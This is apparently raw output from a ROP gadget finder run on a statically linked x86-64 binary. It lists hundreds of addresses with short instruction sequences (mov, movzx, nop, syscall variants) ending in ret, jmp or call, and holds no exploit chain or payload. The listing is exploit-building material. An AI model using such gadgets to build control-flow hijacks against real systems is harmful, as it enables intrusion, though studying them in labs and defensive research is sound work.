0x00000000004942d8 : mov word ptr [rsi], es ; add dword ptr [rdi], 3 ; ret 0xa03
0x0000000000439313 : mov word ptr ss:[rdi + rdx - 2], cx ; mov word ptr [rdi], si ; ret
0x00000000004397e7 : movabs al, byte ptr [0x77f8c5237f7ec1c4] ; ret
0x0000000000455215 : movabs al, byte ptr [0x840fc08548000000] ; ret 5
0x0000000000461b3f : movabs al, byte ptr [0x894774fff883fffd] ; ret 0xe283
0x000000000045619f : movabs byte ptr [0x894928348d48fffa], al ; ret 0x894d
0x00000000004102eb : movabs eax, dword ptr [0xe90d8d4890fffff7] ; ret 6
0x00000000004201a2 : movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x000000000042019e : movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x000000000042024c : movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004365c0 : movdqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x0000000000436e3d : movdqu xmmword ptr [rdi + 0x10], xmm2 ; lea rax, [rdi + 0x1f] ; ret
0x000000000043678d : movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x000000000042781f : movdqu xmmword ptr [rdi + 0xa], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00000000004277af : movdqu xmmword ptr [rdi + 0xb], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000042773f : movdqu xmmword ptr [rdi + 0xc], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00000000004276cf : movdqu xmmword ptr [rdi + 0xd], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000436ddd : movdqu xmmword ptr [rdi + 0xd], xmm2 ; lea rax, [rdi + 0x1c] ; ret
0x000000000043672d : movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x000000000042765f : movdqu xmmword ptr [rdi + 0xe], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000436dfd : movdqu xmmword ptr [rdi + 0xe], xmm2 ; lea rax, [rdi + 0x1d] ; ret
0x000000000043674d : movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x00000000004275ef : movdqu xmmword ptr [rdi + 0xf], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000436e1d : movdqu xmmword ptr [rdi + 0xf], xmm2 ; lea rax, [rdi + 0x1e] ; ret
0x000000000043676d : movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x0000000000427c0f : movdqu xmmword ptr [rdi + 1], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000427b9f : movdqu xmmword ptr [rdi + 2], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000427b2f : movdqu xmmword ptr [rdi + 3], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000427abf : movdqu xmmword ptr [rdi + 4], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000427a4f : movdqu xmmword ptr [rdi + 5], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00000000004279df : movdqu xmmword ptr [rdi + 6], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000042796f : movdqu xmmword ptr [rdi + 7], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00000000004278ff : movdqu xmmword ptr [rdi + 8], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000042788f : movdqu xmmword ptr [rdi + 9], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000439fed : movdqu xmmword ptr [rdi + rdx - 0x20], xmm0 ; ret
0x0000000000426d7b : movdqu xmmword ptr [rdi - 0x10], xmm0 ; ret
0x0000000000426deb : movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000436c54 : movdqu xmmword ptr [rdi], xmm0 ; lea rax, [rdi + 0xf] ; ret
0x00000000004365d4 : movdqu xmmword ptr [rdi], xmm0 ; mov byte ptr [rdi + 0x10], dh ; ret
0x0000000000436617 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x0000000000436607 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x0000000000436688 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x0000000000436648 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x0000000000436668 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00000000004365e8 : movdqu xmmword ptr [rdi], xmm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x0000000000436789 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x0000000000436729 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x0000000000436749 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x0000000000436769 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x000000000042759a : movdqu xmmword ptr [rdi], xmm0 ; ret
0x00000000004275f4 : movdqu xmmword ptr [rdi], xmm1 ; ret
0x00000000004365c1 : movq mm0, qword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x0000000000436e3e : movq qword ptr [rdi + 0x10], mm2 ; lea rax, [rdi + 0x1f] ; ret
0x000000000043678e : movq qword ptr [rdi + 0x10], mm2 ; ret
0x0000000000427820 : movq qword ptr [rdi + 0xa], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00000000004277b0 : movq qword ptr [rdi + 0xb], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000427740 : movq qword ptr [rdi + 0xc], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00000000004276d0 : movq qword ptr [rdi + 0xd], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000436dde : movq qword ptr [rdi + 0xd], mm2 ; lea rax, [rdi + 0x1c] ; ret
0x000000000043672e : movq qword ptr [rdi + 0xd], mm2 ; ret
0x0000000000427660 : movq qword ptr [rdi + 0xe], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000436dfe : movq qword ptr [rdi + 0xe], mm2 ; lea rax, [rdi + 0x1d] ; ret
0x000000000043674e : movq qword ptr [rdi + 0xe], mm2 ; ret
0x00000000004275f0 : movq qword ptr [rdi + 0xf], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000436e1e : movq qword ptr [rdi + 0xf], mm2 ; lea rax, [rdi + 0x1e] ; ret
0x000000000043676e : movq qword ptr [rdi + 0xf], mm2 ; ret
0x0000000000427c10 : movq qword ptr [rdi + 1], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000427ba0 : movq qword ptr [rdi + 2], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000427b30 : movq qword ptr [rdi + 3], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000427ac0 : movq qword ptr [rdi + 4], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000427a50 : movq qword ptr [rdi + 5], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x00000000004279e0 : movq qword ptr [rdi + 6], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000427970 : movq qword ptr [rdi + 7], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000427900 : movq qword ptr [rdi + 8], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000427890 : movq qword ptr [rdi + 9], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x0000000000439f75 : movq qword ptr [rdi + rdx - 0x10], mm0 ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x0000000000439fee : movq qword ptr [rdi + rdx - 0x20], mm0 ; ret
0x0000000000426d7c : movq qword ptr [rdi - 0x10], mm0 ; ret
0x0000000000426dec : movq qword ptr [rdi - 0x10], mm1 ; ret
0x0000000000427527 : movq qword ptr [rdi - 0x11], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00000000004274a7 : movq qword ptr [rdi - 0x12], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000427417 : movq qword ptr [rdi - 0x13], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000427397 : movq qword ptr [rdi - 0x14], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000427317 : movq qword ptr [rdi - 0x15], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000427297 : movq qword ptr [rdi - 0x16], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000427217 : movq qword ptr [rdi - 0x17], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000427197 : movq qword ptr [rdi - 0x18], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000427117 : movq qword ptr [rdi - 0x19], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000427097 : movq qword ptr [rdi - 0x1a], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000427017 : movq qword ptr [rdi - 0x1b], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000426f97 : movq qword ptr [rdi - 0x1c], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000426f07 : movq qword ptr [rdi - 0x1d], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000426e77 : movq qword ptr [rdi - 0x1e], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000426de7 : movq qword ptr [rdi - 0x1f], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000436c55 : movq qword ptr [rdi], mm0 ; lea rax, [rdi + 0xf] ; ret
0x00000000004365d5 : movq qword ptr [rdi], mm0 ; mov byte ptr [rdi + 0x10], dh ; ret
0x0000000000436628 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x0000000000436618 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x0000000000436608 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x0000000000436689 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x0000000000436649 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x0000000000436669 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00000000004365e9 : movq qword ptr [rdi], mm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x000000000043678a : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x000000000043672a : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x000000000043674a : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x000000000043676a : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x000000000042759b : movq qword ptr [rdi], mm0 ; ret
0x00000000004275f5 : movq qword ptr [rdi], mm1 ; ret
0x000000000044795c : movsb byte ptr [rdi], byte ptr [rsi] ; and al, 0x88 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000439275 : movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x000000000047d029 : movsb byte ptr [rdi], byte ptr [rsi] ; cli ; call rsi
0x000000000047cfe9 : movsb byte ptr [rdi], byte ptr [rsi] ; cli ; jmp rax
0x0000000000490262 : movsb byte ptr [rdi], byte ptr [rsi] ; in eax, 0x24 ; outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x00000000004914bd : movsb byte ptr [rdi], byte ptr [rsi] ; jns 0x491516 ; jmp 0x491457
0x0000000000439267 : movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000049684c : movsb byte ptr [rdi], byte ptr [rsi] ; sal edi, 1 ; call qword ptr [rdx]
0x00000000004939dc : movsb byte ptr [rdi], byte ptr [rsi] ; sbb al, 0xfe ; call rsp
0x000000000046b3cc : movsb byte ptr [rdi], byte ptr [rsi] ; xor eax, eax ; ret
0x000000000040f77f : movsd dword ptr [rdi], dword ptr [rsi] ; and byte ptr [rcx], ch ; add byte ptr [rcx + 0x39], cl ; ret 0x870f
0x000000000047d021 : movsd dword ptr [rdi], dword ptr [rsi] ; cli ; call rsi
0x000000000047cfe1 : movsd dword ptr [rdi], dword ptr [rsi] ; cli ; jmp rax
0x000000000047cfdd : movsd dword ptr [rdi], dword ptr [rsi] ; cli ; push qword ptr [rax - 0x5b] ; cli ; jmp rax
0x0000000000491af5 : movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x00000000004582b5 : movsd dword ptr [rdi], dword ptr [rsi] ; jmp 0xffffffffc3c982bf
0x00000000004913b1 : movsd dword ptr [rdi], dword ptr [rsi] ; mov cl, byte ptr [rip - 0x114f09b0] ; fcmovb st(0), st(3) ; ret
0x000000000046deb2 : movsd dword ptr [rdi], dword ptr [rsi] ; ret
0x0000000000475114 : movss dword ptr [rsp - 0x28], xmm0 ; ret
0x000000000047d020 : movsw word ptr [rdi], word ptr [rsi] ; cli ; call rsi
0x000000000046c8fa : movsx eax, dl ; neg eax ; ret
0x0000000000416c11 : movsxd r9, dword ptr [r10 + r9*4] ; lea r10, [r10 + r9] ; jmp r10
0x00000000004251fb : movsxd r9, dword ptr [r11 + r9*4] ; add r9, r11 ; jmp r9
0x000000000041fc7b : movsxd r9, dword ptr [r11 + r9*4] ; lea r9, [r11 + r9] ; jmp r9
0x00000000004763b8 : movsxd rax, dword ptr [r12 + rax*4] ; add rax, r12 ; jmp rax
0x0000000000476cb9 : movsxd rax, dword ptr [r14 + rax*4] ; add rax, r14 ; jmp rax
0x0000000000475367 : movsxd rax, dword ptr [r15 + rax*4] ; add rax, r15 ; jmp rax
0x0000000000475141 : movsxd rax, dword ptr [r8 + rcx*4] ; add rax, r8 ; jmp rax
0x00000000004768f1 : movsxd rax, dword ptr [r9 + r11*4] ; add rax, r9 ; jmp rax
0x0000000000475142 : movsxd rax, dword ptr [rax + rcx*4] ; add rax, r8 ; jmp rax
0x000000000040d7be : movsxd rax, dword ptr [rax - 0x77] ; add ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x000000000043efff : movsxd rax, dword ptr [rbp + rax*4] ; add rax, rbp ; jmp rax
0x000000000043ef88 : movsxd rax, dword ptr [rbx + rax*4] ; add rax, rbx ; jmp rax
0x000000000044eb45 : movsxd rax, dword ptr [rbx - 0x53343] ; call qword ptr [rax]
0x000000000045be27 : movsxd rax, dword ptr [rcx + rax*4] ; add rax, rcx ; jmp rax
0x00000000004768f2 : movsxd rax, dword ptr [rcx + rbx*4] ; add rax, r9 ; jmp rax
0x00000000004392cd : movsxd rax, dword ptr [rcx] ; add byte ptr [rax], al ; mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000475368 : movsxd rax, dword ptr [rdi + rax*4] ; add rax, r15 ; jmp rax
0x0000000000401b62 : movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x000000000043b3f4 : movsxd rax, dword ptr [rdx + rbx*4] ; add rax, rdx ; jmp rax
0x0000000000466cf3 : movsxd rax, dword ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x8b48
0x0000000000467bdd : movsxd rax, dword ptr [rsi + r12*4] ; add rax, rsi ; jmp rax
0x0000000000476cba : movsxd rax, dword ptr [rsi + rax*4] ; add rax, r14 ; jmp rax
0x000000000045c53c : movsxd rax, dword ptr [rsi + rax*4] ; add rax, rsi ; jmp rax
0x000000000043a438 : movsxd rax, dword ptr [rsi + rdi*4] ; add rax, rsi ; jmp rax
0x000000000043a4f2 : movsxd rax, dword ptr [rsi + rdx*4] ; add rax, rsi ; jmp rax
0x0000000000467bde : movsxd rax, dword ptr [rsi] ; add rax, rsi ; jmp rax
0x00000000004763b9 : movsxd rax, dword ptr [rsp + rax*4] ; add rax, r12 ; jmp rax
0x000000000046fdcd : movsxd rax, ecx ; add rax, rdi ; sub rax, r8 ; ret
0x0000000000438f07 : movsxd rax, ecx ; add rax, rdi ; sub rax, rsi ; ret
0x0000000000438eb4 : movsxd rax, ecx ; ret
0x0000000000400a78 : movsxd rbp, dword ptr [rax] ; sub al, byte ptr [rax] ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000438ef9 : movsxd rbx, ecx ; add cl, byte ptr [rdi] ; xchg eax, edx ; ror byte ptr [rdi], 0x94 ; ret 0xc085
0x000000000041e5ad : movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x0000000000436389 : movsxd rcx, dword ptr [r11 + rdx*4] ; lea rcx, [r11 + rcx] ; jmp rcx
0x00000000004251fc : movsxd rcx, dword ptr [rbx + rcx*4] ; add r9, r11 ; jmp r9
0x000000000041fc7c : movsxd rcx, dword ptr [rbx + rcx*4] ; lea r9, [r11 + r9] ; jmp r9
0x000000000041e5ae : movsxd rcx, dword ptr [rbx + rdx*4] ; add rcx, r11 ; jmp rcx
0x000000000043638a : movsxd rcx, dword ptr [rbx + rdx*4] ; lea rcx, [r11 + rcx] ; jmp rcx
0x0000000000416c12 : movsxd rcx, dword ptr [rdx + rcx*4] ; lea r10, [r10 + r9] ; jmp r10
0x000000000043a460 : movsxd rcx, dword ptr [rsi + rax*4] ; add rcx, rsi ; jmp rcx
0x0000000000438f47 : movsxd rcx, ecx ; lea rax, [rdi + rcx] ; sub rax, rsi ; ret
0x0000000000405cc7 : movsxd rdi, dword ptr [r10 + rdi*4] ; add rdi, r10 ; jmp rdi
0x0000000000405cc8 : movsxd rdi, dword ptr [rdx + rdi*4] ; add rdi, r10 ; jmp rdi
0x0000000000497139 : movsxd rdi, eax ; jmp qword ptr [rbx]
0x000000000041fd4f : movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, [r11 + rdx] ; jmp rdx
0x000000000041fd50 : movsxd rdx, dword ptr [rbx + rdx*4] ; lea rdx, [r11 + rdx] ; jmp rdx
0x00000000004059df : movsxd rdx, dword ptr [rdi + rdx*4] ; add rdx, rdi ; jmp rdx
0x000000000043b669 : movsxd rdx, eax ; jmp 0x43b413
0x00000000004498b0 : movsxd rsi, dword ptr [r8 + r9*4] ; add rsi, r8 ; jmp rsi
0x00000000004498b1 : movsxd rsi, dword ptr [rax + rcx*4] ; add rsi, r8 ; jmp rsi
0x000000000043836c : movsxd rsi, esi ; ret 0x7520
0x000000000043942f : movups xmmword ptr [r11], xmm4 ; ret
0x00000000004394b6 : movups xmmword ptr [r11], xmm8 ; ret
0x00000000004394b7 : movups xmmword ptr [rbx], xmm0 ; ret
0x0000000000439430 : movups xmmword ptr [rbx], xmm4 ; ret
0x000000000043942b : movups xmmword ptr [rcx - 0x30], xmm0 ; movups xmmword ptr [r11], xmm4 ; ret
0x000000000043942a : movups xmmword ptr [rcx - 0x30], xmm8 ; movups xmmword ptr [r11], xmm4 ; ret
0x00000000004394b2 : movups xmmword ptr [rdi + 0x30], xmm7 ; movups xmmword ptr [r11], xmm8 ; ret
0x0000000000439212 : movups xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x0000000000439399 : movups xmmword ptr [rdi + rdx - 0x20], xmm3 ; ret
0x0000000000439376 : movups xmmword ptr [rdi + rdx - 0x40], xmm7 ; ret
0x000000000043920f : movups xmmword ptr [rdi], xmm0 ; movups xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x0000000000475115 : movups xmmword ptr [rsp - 0x28], xmm0 ; ret
0x0000000000461ec1 : movzx eax, al ; add rsp, 0x58 ; ret
0x000000000040c06f : movzx eax, al ; neg eax ; pop rbx ; ret
0x0000000000472d1c : movzx eax, al ; neg eax ; ret
0x000000000046f7d9 : movzx eax, al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004402a0 : movzx eax, al ; xor edx, edx ; add eax, 1 ; push rax ; call rbx
0x000000000040c850 : movzx eax, bpl ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000047836e : movzx eax, byte ptr [rax] ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000040bbec : movzx eax, byte ptr [rax] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040a8fe : movzx eax, byte ptr [rax] ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000040bbca : movzx eax, byte ptr [rax] ; ret
0x000000000044ee5f : movzx eax, byte ptr [rdi + rax] ; mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x0000000000417fa8 : movzx eax, byte ptr [rdi + rdx] ; sub eax, ecx ; ret
0x000000000041e340 : movzx eax, byte ptr [rdi] ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x000000000041de80 : movzx eax, byte ptr [rdi] ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x0000000000417fc3 : movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x000000000040a910 : movzx eax, byte ptr [rdx] ; ret
0x000000000040c851 : movzx eax, ch ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000043a4c0 : movzx eax, cl ; pop rbx ; ret
0x00000000004389ca : movzx ecx, byte ptr [rsi + rdx + 3] ; test cl, cl ; jne 0x4389c9 ; ret
0x0000000000438a7a : movzx ecx, byte ptr [rsi + rdx + 3] ; test cl, cl ; jne 0x438a79 ; ret
0x000000000041f464 : movzx ecx, byte ptr [rsi - 1] ; sub eax, ecx ; ret
0x00000000004392e8 : movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000417fc0 : movzx ecx, byte ptr [rsi] ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x000000000041e343 : movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x0000000000406263 : movzx edx, byte ptr [rdi] ; test dl, dl ; jne 0x40624b ; ret
0x0000000000418181 : movzx edx, byte ptr [rdx + rcx] ; sub eax, edx ; ret
0x000000000041c5f8 : movzx edx, byte ptr [rsi + rcx] ; sub eax, edx ; ret
0x000000000041e2c8 : movzx edx, byte ptr [rsi + rcx] ; sub eax, edx ; vzeroupper ; ret
0x0000000000418013 : movzx edx, byte ptr [rsi + rdx] ; sub eax, edx ; ret
0x0000000000438394 : movzx edx, byte ptr [rsi - 0x10] ; sub eax, edx ; ret
0x00000000004383f4 : movzx edx, byte ptr [rsi - 0xa] ; sub eax, edx ; ret
0x00000000004383e4 : movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x00000000004383d4 : movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x00000000004383c4 : movzx edx, byte ptr [rsi - 0xd] ; sub eax, edx ; ret
0x00000000004383b4 : movzx edx, byte ptr [rsi - 0xe] ; sub eax, edx ; ret
0x00000000004383a4 : movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x0000000000427540 : movzx edx, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x000000000041f217 : movzx edx, byte ptr [rsi - 1] ; sub eax, edx ; ret
0x000000000043837b : movzx edx, byte ptr [rsi - 9] ; sub eax, edx ; ret
0x0000000000427c20 : movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x000000000041de83 : movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x000000000041dea9 : movzx edx, dl ; sub eax, edx ; ret
0x00000000004274c0 : movzx edx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x0000000000427bb0 : movzx edx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x000000000045fb97 : mul byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x000000000043b6f7 : neg eax ; mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x000000000040c072 : neg eax ; pop rbx ; ret
0x000000000040ee5f : neg eax ; ret
0x0000000000426c77 : nop ; add byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x0000000000401483 : nop ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000041e8cc : nop ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000049cf85 : nop ; add byte ptr [rax], al ; jo 0x49cf8e ; jmp qword ptr [rdx]
0x000000000049cf84 : nop ; add byte ptr [rax], al ; jo 0x49cf8f ; jmp qword ptr [rdx]
0x000000000046211c : nop ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000496734 : nop ; add dword ptr [rsi + rcx + 0x10], ecx ; ret
0x00000000004403df : nop ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004726bf : nop ; add rsp, 8 ; ret
0x000000000047d798 : nop ; and bl, bh ; push qword ptr [rax] ; and bh, bl ; call rax
0x000000000041103f : nop ; call rax
0x0000000000440bd0 : nop ; call rsi
0x0000000000400b31 : nop ; leave ; ret
0x000000000042184f : nop ; mov dl, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000421a2f : nop ; mov dx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x000000000046fe3f : nop ; mov eax, 0x27 ; syscall ; ret
0x000000000046163f : nop ; mov eax, 0xc9 ; syscall ; ret
0x000000000040d82f : nop ; mov eax, 0xffffffff ; ret
0x000000000046b76f : nop ; mov eax, 1 ; pop rbx ; ret
0x0000000000421def : nop ; mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000436b1f : nop ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; lea rax, [rdi + 3] ; ret
0x000000000045e759 : nop ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x0000000000468b6f : nop ; mov qword ptr [rbp - 0xe0], r11 ; call r10
0x000000000047752f : nop ; mov rax, qword ptr [rdi + 0x98] ; ret
0x000000000047529f : nop ; mov rax, qword ptr [rsi + 0xb8] ; ret
0x000000000047843f : nop ; mov rax, qword ptr [rsi + 8] ; ret
0x00000000004365bf : nop ; movdqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x000000000047219f : nop ; pop rbx ; ret
0x00000000004004cf : nop ; ret
0x000000000047d2f4 : nop ; sar dl, cl ; jmp qword ptr [rax]
0x000000000047d818 : nop ; sti ; jmp qword ptr [rax]
0x00000000004797f4 : nop ; stosd dword ptr [rdi], eax ; and al, byte ptr [rax] ; test eax, eax ; je 0x479809 ; ret
0x000000000047cdfc : nop ; stosd dword ptr [rdi], eax ; cli ; jmp qword ptr [rax]
0x0000000000464cba : nop ; sub byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000047d7b8 : nop ; sub eax, 0x2f30fffb ; sti ; call rax
0x000000000040ea1f : nop ; sub edx, dword ptr [rax + 0x10] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x000000000040c03f : nop ; xor eax, eax ; ret
0x000000000047a5c3 : nop dword ptr [rax + rax] ; add rsp, 8 ; ret
0x0000000000406fe8 : nop dword ptr [rax + rax] ; call qword ptr [rbx]
0x0000000000474ab3 : nop dword ptr [rax + rax] ; call rax
0x00000000004703c8 : nop dword ptr [rax + rax] ; call rbx
0x000000000041477b : nop dword ptr [rax + rax] ; jmp rax
0x00000000004364fb : nop dword ptr [rax + rax] ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x0000000000400a03 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000409618 : nop dword ptr [rax + rax] ; pop rbx ; ret
0x00000000004009cb : nop dword ptr [rax + rax] ; ret
0x00000000004388cb : nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x000000000046109c : nop dword ptr [rax] ; add rax, 1 ; ret
0x00000000004149f5 : nop dword ptr [rax] ; add rsp, 0x10 ; pop rbx ; ret
0x000000000045e7f5 : nop dword ptr [rax] ; mov eax, 0xffffffff ; ret
0x0000000000400a45 : nop dword ptr [rax] ; pop rbp ; ret
0x000000000043aa6c : nop dword ptr [rax] ; pop rbx ; ret
0x0000000000411035 : nop dword ptr [rax] ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00000000004057ec : nop dword ptr [rax] ; ret
0x000000000040bf7d : nop dword ptr [rax] ; xor eax, eax ; jmp 0x40bf4d
0x000000000040d965 : nop dword ptr [rax] ; xor eax, eax ; ret
0x00000000004703c7 : nop dword ptr cs:[rax + rax] ; call rbx
0x0000000000406fe7 : nop word ptr [rax + rax] ; call qword ptr [rbx]
0x0000000000474ab2 : nop word ptr [rax + rax] ; call rax
